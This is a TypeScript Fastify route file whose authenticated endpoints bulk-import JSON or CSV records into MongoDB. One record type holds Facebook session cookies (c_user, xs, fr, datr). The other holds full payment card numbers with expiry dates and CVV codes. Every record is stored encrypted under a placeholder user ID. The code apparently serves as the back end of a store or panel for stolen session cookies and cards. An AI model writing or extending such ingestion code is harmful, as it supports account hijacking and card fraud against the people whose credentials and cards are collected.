import type { FastifyInstance } from 'fastify';
import { requireAuth } from '../../middleware/auth';
import { getDb } from '../../lib/mongo';
import { encryptJson } from '../../lib/encryption';
import { z } from 'zod';
import multipart from '@fastify/multipart';
import { parse } from 'csv-parse/sync';
import { ObjectId } from 'mongodb';

const stringish = z.union([z.string(), z.number()]).transform((v) => String(v));
const cookieSchema = z.object({ c_user: stringish, xs: stringish, fr: stringish.optional(), datr: stringish.optional(), country: stringish.optional() });
const cardSchema = z.object({ 
  number: stringish, 
  exp_month: stringish, 
  exp_year: stringish, 
  cvv: stringish, 
  country: stringish.optional()
});

export async function uploadRoutes(app: any) {
  app.register(multipart);

  app.post('/api/upload/cookies/json', { preHandler: requireAuth }, async (req: any, reply: any) => {
    try {
      const raw = req.body as any;
      const body = Array.isArray(raw) ? raw : (raw && Array.isArray(raw.items) ? raw.items : null);
      if (!Array.isArray(body)) {
        return reply.code(400).send({ error: 'Request body must be an array or an object with items array' });
      }
      
      const items = z.array(cookieSchema).parse(body);
      const db = await getDb();
      
      const cookiesCollection = db.collection('cookies');
      
      const docs = items.map((i) => ({ 
        payload: encryptJson(i), 
        createdAt: new Date(),
        userId: new ObjectId('000000000000000000000000')
      }));
      
      await cookiesCollection.insertMany(docs);
      return { inserted: docs.length };
    } catch (error) {
      console.error('Error uploading cookies:', error);
      if (error instanceof z.ZodError) {
        return reply.code(400).send({ error: 'Invalid cookie data format', details: error.issues });
      }
      return reply.code(500).send({ error: 'Internal server error', message: (error as Error).message });
    }
  });

  app.post('/api/upload/cards/json', { preHandler: requireAuth }, async (req: any, reply: any) => {
    try {
      const raw = req.body as any;
      const body = Array.isArray(raw) ? raw : (raw && Array.isArray(raw.items) ? raw.items : null);
      if (!Array.isArray(body)) {
        return reply.code(400).send({ error: 'Request body must be an array or an object with items array' });
      }
      
      const items = z.array(cardSchema).parse(body);
      const db = await getDb();
      
      const cardsCollection = db.collection('cards');
      
      const docs = items.map((i) => ({ 
        payload: encryptJson(i), 
        createdAt: new Date(),
        userId: new ObjectId('000000000000000000000000')
      }));
      
      await cardsCollection.insertMany(docs);
      return { inserted: docs.length };
    } catch (error) {
      console.error('Error uploading cards:', error);
      if (error instanceof z.ZodError) {
        return reply.code(400).send({ error: 'Invalid card data format', details: error.issues });
      }
      return reply.code(500).send({ error: 'Internal server error', message: (error as Error).message });
    }
  });

  app.post('/api/upload/cookies/csv', { preHandler: requireAuth }, async (req: any, reply: any) => {
    const parts = req.parts();
    for await (const part of parts) {
      if (part.type === 'file') {
        const buf = await part.toBuffer();
        const records = parse(buf.toString('utf8'), { columns: true, skip_empty_lines: true });
        const items = z.array(cookieSchema).parse(records);
        const db = await getDb();
        const docs = items.map((i) => ({ payload: encryptJson(i), createdAt: new Date() }));
        await db.collection('cookies').insertMany(docs);
        return { inserted: docs.length };
      }
    }
    return reply.code(400).send({ error: 'No file' });
  });

  app.post('/api/upload/cards/csv', { preHandler: requireAuth }, async (req: any, reply: any) => {
    const parts = req.parts();
    for await (const part of parts) {
      if (part.type === 'file') {
        const buf = await part.toBuffer();
        const records = parse(buf.toString('utf8'), { columns: true, skip_empty_lines: true });
        const items = z.array(cardSchema).parse(records);
        const db = await getDb();
        const docs = items.map((i) => ({ payload: encryptJson(i), createdAt: new Date() }));
        await db.collection('cards').insertMany(docs);
        return { inserted: docs.length };
      }
    }
    return reply.code(400).send({ error: 'No file' });
  });
} 